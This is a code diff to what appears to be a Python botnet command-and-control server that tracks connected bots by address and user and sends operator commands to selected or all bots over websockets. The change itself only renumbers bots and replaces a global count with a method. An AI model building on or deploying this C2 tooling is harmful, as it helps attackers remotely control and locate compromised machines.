@@ -77,6 +77,8 @@ class Context:
             self.bots.remove(bot)
             logger.info(f"{bot} removed")
             logger.info(f"Bots : {len(self.bots)}")
+        for bot in self.bots:
+            bot.idx = self.bots.index(bot) + 1
 
     def get_database_summary(self) -> str:
         list_bot = []
@@ -86,7 +88,9 @@ class Context:
         for bot in self.bots:
             x.add_row([termcolor.colored(bot.idx,"yellow",attrs=["bold"]), termcolor.colored(bot.remote_address,"yellow",attrs=["bold"]), termcolor.colored(bot.user,"yellow",attrs=["bold"])])
         return f'\n{x}\n{termcolor.colored("Bots :","cyan",attrs=["bold"])} {termcolor.colored(bot_len,"yellow",attrs=["bold"])}'
-
+    
+    def getLenBots(self):
+        return len(self.bots)
 
 class CommandControl:
     def __init__(self, ctx: Context):
@@ -101,7 +105,6 @@ class CommandControl:
             
             case default:
                 return None
-
 
 
     async def bot_authenticated(self, ws: WebSocketConn):
@@ -122,7 +125,6 @@ class CommandControl:
             pass
 
     async def execute_commands(self, ws: WebSocketConn, idxs: List[int]):
-        global bot_length
         CLI_OPTIONS  = f'\n* {termcolor.colored("Send","red")} "{termcolor.colored("city", "yellow",attrs=["bold"])}" {termcolor.colored("to see current bot location","red")}\n'
         CLI_OPTIONS += f'* {termcolor.colored("Send","red")} "{termcolor.colored("neofetch", "yellow",attrs=["bold"])}" {termcolor.colored("to see a fancy terminal","red")}\n'
         CLI_OPTIONS += f'{termcolor.colored("Enter command : ","yellow", attrs=["bold"])}'
@@ -149,7 +151,7 @@ class CommandControl:
         # finish
         print(f'Longueur de la chaine : {len(idxs)}')
         print(f'Contenu de la chaine : {idxs}')
-        print(f'Test de print de la longueur des bots : {bot_length}')
+        print(f'Test de print de la longueur des bots : {self.ctx.getLenBots()}')
         try:
             await asyncio.gather(*[exec_command(i) for i in idxs])
         except OSError:
@@ -194,7 +196,7 @@ class CommandControl:
                 nums = choice.split(" ")
                 print(f'nums : {nums}')
                 if 'all' in nums or '*' in nums:
-                    nums = list(range(1, bot_length + 1)) 
+                    nums = list(range(1, self.ctx.getLenBots() + 1)) 
                     await self.execute_commands(cli_ws, [int(x) for x in nums])
                     continue
                 elif any(filter(lambda x: not is_num(x), nums)):
